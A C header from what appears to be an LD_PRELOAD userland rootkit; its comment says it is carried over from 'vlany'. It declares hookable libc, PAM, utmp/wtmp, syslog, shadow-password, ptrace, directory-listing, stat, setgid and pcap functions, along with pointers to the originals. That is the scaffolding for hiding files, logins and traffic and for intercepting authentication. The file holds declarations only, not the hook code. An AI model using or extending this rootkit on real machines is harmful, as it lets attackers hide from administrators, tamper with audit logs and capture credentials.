// header for new and old symbols. basically the same as it was in vlany.
// generating this header dynamically would be cool but seems like a lotta effort.

// libdl
void *dlsym(void *handle, const char *symbol);
int dlinfo(void *handle, int request, void *p);
int dladdr(const void *addr, Dl_info *info);

struct utmp *getutent(void);
struct utmpx *getutxent(void);
struct utmp *getutid(const struct utmp *ut);
struct utmpx *getutxid(const struct utmpx *utx);
void getutmp(const struct utmpx *ux, struct utmp *ut);
void getutmpx(const struct utmp *ut, struct utmpx *utx);
struct utmp *getutline(const struct utmp *ut);
struct utmpx *getutxline(const struct utmpx *utx);
struct utmp *pututline(const struct utmp *ut);
struct utmpx *pututxline(const struct utmpx *utx);
void logwtmp(const char *ut_line, const char *ut_name, const char *ut_host);
void updwtmp(const char *wfile, const struct utmp *ut);
void updwtmpx(const char *wfilex, const struct utmpx *utx);

void openlog(const char *ident, int option, int facility);
void syslog(int priority, const char *format, ...);
void __syslog_chk(int priority, int flag, const char *format, ...);
void vsyslog(int priority, const char *format, va_list ap);

long ptrace(void *request, pid_t pid, void *addr, void *data);

int execve(const char *filename, char *const argv[], char *const envp[]);
int execvp(const char *filename, char *const argv[]);

int mkdir(const char *pathname, mode_t mode);
int rmdir(const char *pathname);
struct dirent *readdir(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp);
DIR *opendir(const char *pathname);
DIR *opendir64(const char *pathname);
DIR *fdopendir(int fd);
int chdir(const char *pathname);
int fchdir(int fd);

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz);
ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz);

int unlink(const char *pathname);
int unlinkat(int dirfd, const char *pathname, int flags);

int open(const char *pathname, int flags, mode_t mode);
int open64(const char *pathname, int flags, mode_t mode);
int access(const char *pathname, int amode);
int creat(const char *pathname, mode_t mode);
FILE *fopen(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode);
size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream);
size_t fwrite_unlocked(const void *ptr, size_t size, size_t nmemb, FILE *stream);
ssize_t read(int fd, void *buf, size_t n);
ssize_t write(int fd, const void *buf, size_t n);

int stat(const char *pathname, struct stat *buf);
int stat64(const char *pathname, struct stat64 *buf);
int fstat(int fd, struct stat *buf);
int fstat64(int fd, struct stat64 *buf);
int fstatat(int dirfd, const char *pathname, struct stat *buf, int flags);
int fstatat64(int dirfd, const char *pathname, struct stat64 *buf, int flags);
int lstat(const char *pathname, struct stat *buf);
int lstat64(const char *pathname, struct stat64 *buf);
int __xstat(int version, const char *pathname, struct stat *buf);
int __xstat64(int version, const char *pathname, struct stat64 *buf);
int __fxstat(int version, int fd, struct stat *buf);
int __fxstat64(int version, int fd, struct stat64 *buf);
int __lxstat(int version, const char *pathname, struct stat *buf);
int __lxstat64(int version, const char *pathname, struct stat64 *buf);

struct passwd *getpwnam(const char *name);
struct passwd *getpwuid(uid_t uid);
struct spwd *getspnam(const char *name);
struct passwd *getpwent(void);
int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);

void pam_syslog(const pam_handle_t *pamh, int priority, const char *fmt, ...);
void pam_vsyslog(const pam_handle_t *pamh, int priority, const char *fmt, va_list args);
int pam_authenticate(pam_handle_t *pamh, int flags);
int pam_open_session(pam_handle_t *pamh, int flags);
int pam_acct_mgmt(pam_handle_t *pamh, int flags);

int chown(const char *pathname, uid_t owner, gid_t group);
int chmod(const char *pathname, mode_t mode);
int fchmod(int fd, mode_t mode);
int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags);

int setgid(gid_t gid);
int setegid(gid_t egid);
int setregid(gid_t rgid, gid_t egid);
int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

int socket(int domain, int type, int protocol);
int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user);

typeof(dlsym) *o_dlsym;
typeof(dlinfo) *o_dlinfo;
typeof(dladdr) *o_dladdr;

typeof(getutent) *o_getutent;
typeof(getutxent) *o_getutxent;
typeof(getutid) *o_getutid;
typeof(getutxid) *o_getutxid;
typeof(getutmp) *o_getutmp;
typeof(getutmpx) *o_getutmpx;
typeof(getutline) *o_getutline;
typeof(getutxline) *o_getutxline;
typeof(pututline) *o_pututline;
typeof(pututxline) *o_pututxline;
typeof(logwtmp) *o_logwtmp;
typeof(updwtmp) *o_updwtmp;
typeof(updwtmpx) *o_updwtmpx;

typeof(openlog) *o_openlog;
typeof(vsyslog) *o_vsyslog;

typeof(ptrace) *o_ptrace;

typeof(execve) *o_execve;
typeof(execvp) *o_execvp;

typeof(mkdir) *o_mkdir;
typeof(rmdir) *o_rmdir;
typeof(readdir) *o_readdir;
typeof(readdir64) *o_readdir64;
typeof(opendir) *o_opendir;
typeof(opendir64) *o_opendir64;
typeof(fdopendir) *o_fdopendir;
typeof(chdir) *o_chdir;
typeof(fchdir) *o_fchdir;

typeof(readlink) *o_readlink;
typeof(readlinkat) *o_readlinkat;

typeof(unlink) *o_unlink;
typeof(unlinkat) *o_unlinkat;

typeof(open) *o_open;
typeof(open64) *o_open64;
typeof(access) *o_access;
typeof(creat) *o_creat;
typeof(fopen) *o_fopen;
typeof(fopen64) *o_fopen64;
typeof(fwrite) *o_fwrite;
typeof(fwrite_unlocked) *o_fwrite_unlocked;
typeof(read) *o_read;
typeof(write) *o_write;

typeof(stat) *o_stat;
typeof(stat64) *o_stat64;
typeof(fstat) *o_fstat;
typeof(fstat64) *o_fstat64;
typeof(fstatat) *o_fstatat;
typeof(fstatat64) *o_fstatat64;
typeof(lstat) *o_lstat;
typeof(lstat64) *o_lstat64;
typeof(__xstat) *o_xstat;
typeof(__xstat64) *o_xstat64;
typeof(__fxstat) *o_fxstat;
typeof(__fxstat64) *o_fxstat64;
typeof(__lxstat) *o_lxstat;
typeof(__lxstat64) *o_lxstat64;

typeof(getpwnam) *o_getpwnam;
typeof(getpwuid) *o_getpwuid;
typeof(getspnam) *o_getspnam;
typeof(getpwent) *o_getpwent;
typeof(getpwnam_r) *o_getpwnam_r;

typeof(pam_syslog) *o_pam_syslog;
typeof(pam_vsyslog) *o_pam_vsyslog;
typeof(pam_authenticate) *o_pam_authenticate;
typeof(pam_open_session) *o_pam_open_session;
typeof(pam_acct_mgmt) *o_pam_acct_mgmt;

typeof(chown) *o_chown;
typeof(chmod) *o_chmod;
typeof(fchmod) *o_fchmod;
typeof(fchmodat) *o_fchmodat;

typeof(setgid) *o_setgid;
typeof(setegid) *o_setegid;
typeof(setregid) *o_setregid;
typeof(setresgid) *o_setresgid;

typeof(socket) *o_socket;
typeof(pcap_loop) *o_pcap_loop;
void (*o_callback)(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);